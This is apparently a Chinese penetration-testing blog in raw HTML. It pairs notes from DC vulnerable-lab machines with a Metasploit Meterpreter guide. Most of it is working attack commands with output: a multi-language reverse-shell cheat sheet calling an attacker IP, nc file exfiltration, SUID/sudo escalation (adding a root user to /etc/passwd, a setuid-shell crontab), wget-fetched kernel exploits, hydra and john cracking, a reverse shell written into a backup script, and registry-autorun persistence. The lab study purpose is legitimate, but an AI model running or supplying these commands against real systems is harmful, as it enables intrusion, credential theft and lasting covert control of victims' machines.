<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a><strong>知识点总结</strong></h2><h3 id="1-nc常见用法"><a href="#1-nc常见用法" class="headerlink" title="1.nc常见用法"></a><strong>1.nc常见用法</strong></h3><p>简单介绍下，nc（netcat）网络工具中的瑞士军刀，主要作用如下：</p>
<ul>
<li><strong>实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口</strong></li>
<li><strong>端口的扫描，nc可以作为client发起TCP或UDP连接</strong></li>
<li><strong>机器之间传输文件</strong></li>
</ul>
<table>
<thead>
<tr>
<th><strong>常用命令</strong></th>
<th align="left"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>nc  -lvp   2333</strong></td>
<td align="left"><strong>-l   使用监听模式     -v 显示指令执行过程  用-vv将更详细<br>-p   &lt;通信端口&gt;     设置本地主机使用的通信端口</strong></td>
</tr>
<tr>
<td><strong>-z</strong></td>
<td align="left"><strong>使用0输入/输出模式，只在扫描通信端口时使用</strong></td>
</tr>
<tr>
<td><strong>-w&lt;超时秒数&gt;</strong></td>
<td align="left"><strong>设置等待连线的时间</strong></td>
</tr>
<tr>
<td><strong>-n</strong></td>
<td align="left"><strong>直接使用IP地址，而不通过域名服务器</strong></td>
</tr>
<tr>
<td><strong>-e filename</strong></td>
<td align="left"><strong>program to exec after connect [dangerous!!]</strong></td>
</tr>
</tbody></table>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#TCP端口扫描，-w2设置2s超时时间，避免漏过某些端口</span></span><br><span class="line">root@kali:~<span class="comment"># nc -zv -w2  192.168.126.159 1-100</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 80 (<span class="title">http</span></span>) open</span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 22 (<span class="title">ssh</span></span>) open</span><br><span class="line"></span><br><span class="line"><span class="comment">#UDP端口扫描</span></span><br><span class="line">root@kali:~<span class="comment"># nc -zuv -w2  192.168.126.159 1-100</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 752 (<span class="title">passwd</span></span><span class="literal">-server</span>) open</span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 751 (<span class="title">kerberos</span></span><span class="literal">-master</span>) open</span><br><span class="line"></span><br><span class="line"><span class="comment">#常见用法，用来传输文件</span></span><br><span class="line">靶机：ps aux | nc <span class="literal">-nv</span> <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2333</span> <span class="literal">-q</span> <span class="number">1</span>  <span class="comment">#-q 1的意思是连接成功时候，连接会自动断掉</span></span><br><span class="line">主机：nc <span class="literal">-lp</span> <span class="number">2333</span> &gt; ps.txt </span><br><span class="line"></span><br><span class="line"><span class="comment">#连接目标ip端口后，执行/bin/bash命令，即反弹shell</span></span><br><span class="line">nc <span class="literal">-e</span> /bin/bash <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2333</span></span><br></pre></td></tr></table></figure>

<h3 id="2-常见反弹shell的姿势"><a href="#2-常见反弹shell的姿势" class="headerlink" title="2.常见反弹shell的姿势"></a><strong>2.常见反弹shell的姿势</strong></h3><p>基本上进入靶机后，都要先反弹shell，这样连接更稳定些，也避免端口关闭无法连接，主要的几种方式如下：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bash版本：</span></span><br><span class="line">bash <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">10.0</span>.<span class="number">0.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#nc版本：</span></span><br><span class="line">nc <span class="literal">-e</span> /bin/sh <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">1234</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#顺序执行多条命令，可以用分号;mkfifo 创建管道符</span></span><br><span class="line">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh <span class="literal">-i</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">1234</span> &gt;/tmp/f</span><br><span class="line"></span><br><span class="line"><span class="comment">#远程的输入，作为本地的输入，在本地解释器执行后，再输出到远程，实现反弹shell</span></span><br><span class="line">nc x.x.x.x <span class="number">8888</span>|/bin/sh|nc x.x.x.x <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#perl版本:</span></span><br><span class="line">perl <span class="literal">-e</span> <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#python版本：</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#php版本：</span></span><br><span class="line">php <span class="literal">-r</span> <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ruby版本：</span></span><br><span class="line">ruby <span class="literal">-rsocket</span> <span class="literal">-e</span><span class="string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#java版本</span></span><br><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \<span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br><span class="line"><span class="comment">#lua</span></span><br><span class="line">lua <span class="literal">-e</span> <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>

<h3 id="3-提权姿势总结"><a href="#3-提权姿势总结" class="headerlink" title="3.提权姿势总结"></a><strong>3.提权姿势总结</strong></h3><p>一般提权方式可分为，漏洞提取和文件命令执行提取，下面介绍下本次靶机遇到的几种主要的文件命令提权：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#首先查找具有suid权限的文件，此类型文件执行时可以暂时获得root权限</span></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment">#假设find具有suid权限，可通过-exec执行脚本命令，从而获得root权限</span></span><br><span class="line">find test <span class="literal">-exec</span> <span class="string">'/bin/bash'</span> \;</span><br><span class="line"></span><br><span class="line"><span class="comment">#发现git具有suid权限时，</span></span><br><span class="line">sudo git help config ==》进入交互模式</span><br><span class="line">!/bin/sh ==&gt;反弹shell，从而获得root权限、</span><br><span class="line"></span><br><span class="line"><span class="comment">#发现nmap可以提权时，编写可执行脚本，进行反弹shell</span></span><br><span class="line">echo <span class="string">'os.execute("/bin/sh")'</span> &gt;  chj.nse  <span class="comment">#写入命令</span></span><br><span class="line">sudo nmap -<span class="literal">-script</span>=/home/jens/chj.nse</span><br><span class="line"></span><br><span class="line"><span class="comment">#vi提权，遇到shell受限制时，通过echo $PATH 、echo /home/xx/usr/bin/*查找可执行命令</span></span><br><span class="line">:set shell=/bin/sh	<span class="comment">#vi允许在其中执行脚本和命令，因此可以借此反弹shell提权</span></span><br><span class="line">:shell  </span><br><span class="line"></span><br><span class="line"><span class="comment">#遇到陌生的命令，建议先看下命令说明，找到相关参数，从而实现提权</span></span><br><span class="line">teehee <span class="literal">-h</span></span><br><span class="line">teehee <span class="literal">-a</span> <span class="comment">#可以写入文件内容而不覆盖</span></span><br><span class="line">echo <span class="string">"admin::0:0:::/bin/bash"</span> | sudo teehee <span class="literal">-a</span> /etc/passwd</span><br><span class="line"></span><br><span class="line">echo  <span class="string">"* * * * * root chmod 4777 /bin/sh"</span> | sudo teehee <span class="literal">-a</span> /etc/crontab</span><br><span class="line"><span class="comment">#切换admin用户，即拥有root权限</span></span><br></pre></td></tr></table></figure>

<p>利用漏洞提权：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Linux内核漏洞利用</span></span><br><span class="line">uname <span class="literal">-a</span> <span class="comment">#查看内核版本</span></span><br><span class="line">root@kali:~<span class="comment"># searchsploit ubuntu 16.04	 #查找相关poc</span></span><br><span class="line">root@kali:~<span class="comment"># cat ubuntu_v1604_shell.txt  #介绍exp使用方法</span></span><br><span class="line">An exploit that puts all this together is <span class="keyword">in</span> exploit.tar. Usage:</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./compile.sh</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./doubleput</span><br><span class="line"><span class="comment">#本地搭建web服务，方便靶机下载exp</span></span><br><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer 8000  #搭建http服务，提供文件浏览的web服务</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">8000</span> ...</span><br><span class="line"><span class="variable">$</span> wget http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">8000</span>/exploit.tar <span class="comment">#下载文件</span></span><br><span class="line">tar <span class="literal">-xvf</span> exploit.tar</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">./compile.sh </span><br><span class="line">./doubleput  </span><br><span class="line"></span><br><span class="line"><span class="comment">#本地文件漏洞利用，有时候可能存有一些可利用的文件</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:~/html<span class="variable">$</span> find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null <span class="comment">#查看sudo权限</span></span><br><span class="line">/bin/screen<span class="literal">-4</span>.<span class="number">5.0</span>  <span class="comment">#发现了一个可能可以利用的文件</span></span><br><span class="line">root@kali:~<span class="comment"># searchsploit screen 4.5.0</span></span><br><span class="line">...  <span class="comment">#exp编写过程有点复杂，需要仔细看使用说明，上传到靶机后若无执行权限，记得添加</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:/tmp<span class="variable">$</span> chmod +x <span class="number">41154</span>.sh</span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:/tmp<span class="variable">$</span> ./<span class="number">41154</span>.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#同上</span></span><br><span class="line">root@kali:/var/www/html<span class="comment"># searchsploit exim</span></span><br><span class="line">Exim <span class="number">4.87</span> - <span class="number">4.91</span> - Local Privilege Escalation                                              | exploits/linux/local/<span class="number">46996</span>.sh</span><br></pre></td></tr></table></figure>

<p><strong>总结下此次靶场提权的思路，首先查看具有suid权限的文件是否可利用，如果无可用再查看内核版本是否有漏洞。</strong></p>
<h3 id="4-get-webshell思路"><a href="#4-get-webshell思路" class="headerlink" title="4.get webshell思路"></a><strong>4.get webshell思路</strong></h3><h4 id="4-1-信息收集"><a href="#4-1-信息收集" class="headerlink" title="4.1.信息收集"></a><strong>4.1.信息收集</strong></h4><p><strong>cms指纹识别—whatweb、火狐插件wappalyzer</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#whatweb用来时别cms信息比较快，支持批量导入，导出也可以以各种文件的形式</span></span><br><span class="line">whatweb ip</span><br><span class="line">whatweb <span class="literal">-i</span> /root/url.txt</span><br><span class="line">whatweb <span class="literal">-i</span> xx -<span class="literal">-log</span><span class="literal">-verbose</span>=xx.txt</span><br></pre></td></tr></table></figure>

<p><strong>后台路径爆破–Dirbuster、dirb命令</strong></p>
<p>dirbuster使用方法比较简单，主要是要有一个强大的字典，使用页面如下：</p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/28.png" alt></p>
<p>dirb的主要使用方式如下：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">dirb  http://<span class="number">192.168</span>.<span class="number">126.33</span>  /usr/share/wordlists/dirb/big.txt <span class="comment">#kail自带字典</span></span><br><span class="line"><span class="comment">#-a 设置user-agent   -c 设置cookie</span></span><br><span class="line"><span class="comment">#User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器</span></span><br><span class="line"><span class="comment">#能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器插件等</span></span><br><span class="line">dirb http://<span class="number">192.168</span>.<span class="number">1.116</span> <span class="literal">-a</span> <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) </span></span><br><span class="line"><span class="string">Gecko/20100101 Firefox/75.0"</span>  <span class="literal">-c</span> <span class="string">"BAIDUID=D5C6351DAC89EF8811A..."</span></span><br><span class="line"></span><br><span class="line">dirb http://<span class="number">192.168</span>.<span class="number">1.116</span>  <span class="literal">-X</span> .dist <span class="literal">-z</span> <span class="number">100</span> <span class="literal">-o</span> test.txt</span><br><span class="line"><span class="comment">#-X 在每个字典的后面添加一个后缀  -z 添加毫秒延迟，避免洪水攻击</span></span><br><span class="line"><span class="comment">#-o 输出结果</span></span><br><span class="line"></span><br><span class="line">dirb http://<span class="number">192.168</span>.<span class="number">1.116</span>  <span class="literal">-p</span> <span class="number">46.17</span>.<span class="number">45.194</span>:<span class="number">5210</span> <span class="comment">#使用代理</span></span><br></pre></td></tr></table></figure>

<p>wpscan：<strong><code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞</strong></p>
<p><strong>该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的<code>Wordpress</code>站点暴力破解用户名密码</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -e vp #  u  #扫描存在用户</span></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -U users.txt -P passwd.txt #破解用户密码</span></span><br><span class="line">wpscan -<span class="literal">-url</span> http://dc<span class="literal">-2</span> <span class="literal">-e</span> vp <span class="comment">#只枚举有漏洞的插件</span></span><br><span class="line">wpscan -<span class="literal">-url</span> http://dc<span class="literal">-2</span> <span class="literal">-e</span> vt <span class="comment">#扫描主题中存在的漏洞</span></span><br></pre></td></tr></table></figure>

<p>防御手段：</p>
<ul>
<li>使用<code>Block Bad Queries (BBQ)</code>插件，就可以屏蔽和禁止这类扫描（<strong>防范扫描插件、主题、TimThumb文件</strong>)</li>
<li>防止暴力破解的最好方式是限制一个<code>IP</code>地址的尝试登录次数</li>
</ul>
<p><strong>密码本制作–cewl</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cewl -w passwd.txt http://dc-2 # -w 字典存为文件</span></span><br><span class="line">root@kali:~<span class="comment"># cewl -w passwd.txt http://dc-2 -m 8 # -m 密码长度至少8位数</span></span><br><span class="line">cewl <span class="literal">-w</span> passwd.txt http://dc<span class="literal">-2</span> <span class="literal">-d</span> <span class="number">3</span> <span class="comment"># -d 增加深度获取更大的字典文件，默认为2</span></span><br></pre></td></tr></table></figure>

<h4 id="4-2-密码爆破"><a href="#4-2-密码爆破" class="headerlink" title="4.2.密码爆破"></a><strong>4.2.密码爆破</strong></h4><p>hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码，但是如果目标网站登录时候需要验证码就无法破解了</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-f 一对密码破解后终止 -vV详细过程 ，以post方式提交</span></span><br><span class="line">hydra <span class="literal">-l</span> admin <span class="literal">-P</span> ./rockyou.txt  <span class="operator">-f</span> <span class="number">192.168</span>.<span class="number">17.130</span>  http<span class="literal">-post</span><span class="literal">-form</span>   <span class="string">"/login.php:username=^USER^&amp;password=^PASS^:S=logout"</span> <span class="literal">-vV</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-L 用户名字典  -t 64 表示线程数 ssh破解</span></span><br><span class="line">hydra <span class="literal">-L</span> users.txt <span class="literal">-P</span> pswd.txt ssh://<span class="number">192.168</span>.<span class="number">126.149</span> <span class="literal">-t</span> <span class="number">64</span> <span class="operator">-f</span> <span class="literal">-v</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#以get方式提交</span></span><br><span class="line">hydra <span class="literal">-L</span> users.txt <span class="literal">-P</span> pswd.txt  <span class="operator">-f</span> <span class="number">192.168</span>.<span class="number">17.130</span>  http<span class="literal">-get</span> /admin/index.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#破解https </span></span><br><span class="line">hydra <span class="literal">-m</span> /index.php <span class="literal">-l</span> muts <span class="literal">-P</span> pass.txt <span class="number">10.36</span>.<span class="number">16.18</span> https</span><br></pre></td></tr></table></figure>

<p>John the Ripper是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文，支持目前大多数的加密算法，如DES、MD4、MD5等</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加密码本，后面是待破解的，需要花费的时间比较久</span></span><br><span class="line">john -<span class="literal">-wordlist</span>=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#john工具对于同一个shadow文件只会进行一次爆破，如果第二次执行john shadow是不会得到结果的</span></span><br><span class="line">john -<span class="literal">-show</span> password <span class="comment">#用此查看上一次爆破结果</span></span><br><span class="line">-<span class="literal">-format</span>=DES/MD5...  <span class="comment">#指定密文格式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#快速时别hash加密方式</span></span><br><span class="line">hashid xxx</span><br></pre></td></tr></table></figure>

<h3 id="5-内网渗透技巧"><a href="#5-内网渗透技巧" class="headerlink" title="5.内网渗透技巧"></a><strong>5.内网渗透技巧</strong></h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将靶机本地文件，发送到主机上</span></span><br><span class="line">scp ./old<span class="literal">-passwords</span>.bak root@<span class="number">192.168</span>.<span class="number">126.33</span>:/root/tools</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载主机文件到靶机上</span></span><br><span class="line">攻击机：python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line">靶机：wget http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">8000</span>/exploit.tar </span><br><span class="line"></span><br><span class="line"><span class="comment">#写入脚本到文件中</span></span><br><span class="line">echo <span class="string">"nc -e /bin/bash 192.168.126.33 2222"</span> &gt;&gt; backups.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#交互显示</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>渗透工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit</title>
    <url>/2020/09/11/Metasploit/</url>
    <content><![CDATA[<p>主要介绍下Meterpreter攻击载荷模块</p>
<h2 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a><strong>1.常用命令</strong></h2><table>
<thead>
<tr>
<th align="center"><strong>background</strong></th>
<th align="center"><strong>将meterpreter隐藏在后台</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>sessions</strong></td>
<td align="center"><strong>查看已经成功获取的会话</strong></td>
</tr>
<tr>
<td align="center"><strong>quit</strong></td>
<td align="center"><strong>关闭meterpreter会话返回msf</strong></td>
</tr>
</tbody></table>
<p><strong><img src="/2020/09/11/Metasploit/1.png" alt></strong></p>
<h3 id="1-1文件系统命令"><a href="#1-1文件系统命令" class="headerlink" title="1.1文件系统命令"></a><strong>1.1文件系统命令</strong></h3><table>
<thead>
<tr>
<th align="center"><strong>getwd</strong></th>
<th align="center"><strong>目标机当前的工作目录</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>getlwd</strong></td>
<td align="center"><strong>当前系统的工作目录</strong></td>
</tr>
<tr>
<td align="center"><strong>upload</strong></td>
<td align="center"><strong>上传文件到目标机器</strong></td>
</tr>
<tr>
<td align="center"><strong>download</strong></td>
<td align="center"><strong>从目标机器上下载文件（注意路径符号）</strong></td>
</tr>
<tr>
<td align="center"><strong>edit</strong></td>
<td align="center"><strong>调用vi对目标机的文件进行编辑</strong></td>
</tr>
<tr>
<td align="center"><strong>search  -h</strong></td>
<td align="center"><strong>文件搜索</strong></td>
</tr>
</tbody></table>
<p><img src="/2020/09/11/Metasploit/2.png" alt></p>
<h3 id="1-2-网络命令"><a href="#1-2-网络命令" class="headerlink" title="1.2 网络命令"></a><strong>1.2 网络命令</strong></h3><p><strong>portfwd是端口转发命令，假设3389只允许内网访问，可用此命令进行端口转发，从而能直接访问目标主机</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">'%COMPUTERNAME%'</span> call SetAllowTSConnections <span class="number">1</span>  <span class="comment">#开启3389</span></span><br><span class="line">portfwd add <span class="literal">-l</span> <span class="number">1234</span> <span class="literal">-p</span> <span class="number">3389</span> <span class="literal">-r</span> <span class="number">192.168</span>.xx.xx</span><br><span class="line">root@kali:~/tools<span class="comment"># rdesktop -u admin -p 1234 127.0.0.1:1234</span></span><br><span class="line">route <span class="comment">#显示主机路由信息</span></span><br></pre></td></tr></table></figure>

<h3 id="1-3-系统命令"><a href="#1-3-系统命令" class="headerlink" title="1.3 系统命令"></a><strong>1.3 系统命令</strong></h3><table>
<thead>
<tr>
<th align="center"><strong>ps</strong></th>
<th align="left"><strong>显示目标主机上的进程</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>migrate    304</strong></td>
<td align="left"><strong>可以将meterpreter会话从一个进程移植到另一个进程的内存空间（避免用户关闭进程终止会话连接，可以将进程移植到稳定的系统服务进程中，不需要断开已有的tcp连接） 这里的304是指进程的pid</strong></td>
</tr>
<tr>
<td align="center"><strong>getpid</strong></td>
<td align="left"><strong>获取当前会话所在进程的PID值</strong></td>
</tr>
<tr>
<td align="center"><strong>getuid</strong></td>
<td align="left"><strong>查看当前具有的权限</strong></td>
</tr>
<tr>
<td align="center"><strong>kill 1840</strong></td>
<td align="left"><strong>结束目标进程</strong></td>
</tr>
<tr>
<td align="center"><strong>sysinfo</strong></td>
<td align="left"><strong>查看目标系统信息</strong></td>
</tr>
<tr>
<td align="center"><strong>shutdown</strong></td>
<td align="left"><strong>关闭目标主机</strong></td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; execute -H -f cmd.exe  #隐藏执行cmd.exe程序</span><br><span class="line">Process 2076 created.</span><br><span class="line">meterpreter &gt; execute -H -i -f   cmd.exe   #进行交互    </span><br><span class="line">Process 2740 created.                          </span><br><span class="line">Channel 1 created.                                                                     </span><br><span class="line">C:\&gt;whoami                                     </span><br><span class="line">execute -H -m -d normal.exe -f wce.exe -a "-o foo.txt" #wce.exe是攻击机上的可执行文件，后面是参数</span><br><span class="line"><span class="meta">#</span><span class="bash">-H 表示隐藏执行，-d 表示伪装在目标机器上的进程，-m支持直接从内存中执行攻击端的文件</span></span><br></pre></td></tr></table></figure>

<h2 id="2-后渗透攻击模块"><a href="#2-后渗透攻击模块" class="headerlink" title="2.后渗透攻击模块"></a><strong>2.后渗透攻击模块</strong></h2><p>主要步骤如下：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http                                                                                                                               </span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">126.33</span>                                                                                                                                                   </span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport <span class="number">1234</span>                                                                                                                              </span><br><span class="line">lport =&gt; <span class="number">1234</span>                                                                                                                                                             </span><br><span class="line">msf5 exploit(multi/handler) &gt; run                                                                                                                                                                                                                                                                                                                 </span><br><span class="line">[*] Started HTTP reverse handler on http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span>                                                                                                            </span><br><span class="line">[*] http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span> handling request from <span class="number">192.168</span>.<span class="number">126.151</span>; (UUID: fop9sg                                                                                       hd) Staging x86 payload (<span class="number">181337</span> bytes) ...                                                                                                                                </span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span> -&gt; <span class="number">192.168</span>.<span class="number">126.151</span>:<span class="number">1087</span>) at <span class="number">2</span>                                                                                       <span class="number">020</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">29</span> +<span class="number">0800</span>                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">meterpreter &gt; arp<span class="literal">-a</span></span><br></pre></td></tr></table></figure>



<p>通过Persistence与metsvc等后渗透攻击模块，在目标主机上安装自启动和永久服务的方式，可以长久的控制目标主机！</p>
<h3 id="2-1-persistence后渗透攻击模块"><a href="#2-1-persistence后渗透攻击模块" class="headerlink" title="2.1 persistence后渗透攻击模块"></a><strong>2.1 persistence后渗透攻击模块</strong></h3><p>运行后，会在目标主机的注册表键中添加键值，达到自启动的目的</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run persistence <span class="literal">-X</span> <span class="literal">-i</span> <span class="number">5</span> <span class="literal">-p</span> <span class="number">443</span> <span class="literal">-r</span> <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line"><span class="comment">#-X 表示开机自启动，-i表示反向连接的间隔时间</span></span><br><span class="line">[!] Meterpreter scripts are deprecated. <span class="keyword">Try</span> exploit/windows/local/persistence.</span><br><span class="line">[!] Example: run exploit/windows/local/persistence OPTION=value [<span class="type">...</span>]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file <span class="keyword">for</span> cleanup created at /root/.msf4/logs/persistence/STU1_20200912.<span class="number">0938</span>/STU1_20200912.<span class="number">0938</span>.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">126.33</span> LPORT=<span class="number">443</span></span><br><span class="line">[*] Persistent agent script is <span class="number">99613</span> bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\jveynIXzUsxp.vbs</span><br><span class="line">[*] Executing script C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\jveynIXzUsxp.vbs</span><br><span class="line">[+] Agent executed with PID <span class="number">1832</span></span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\AcgmcGcp</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\AcgmcGcp</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.126.33</span><br><span class="line">lhost =&gt; 192.168.126.33</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 443</span><br><span class="line">lport =&gt; 443</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.126.33:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.126.151</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.126.33:443 -&gt; 192.168.126.151:1440) at 2020-09-12 16:49:24 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer        : STU1</span><br><span class="line">OS              : Windows 7 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : GOD</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

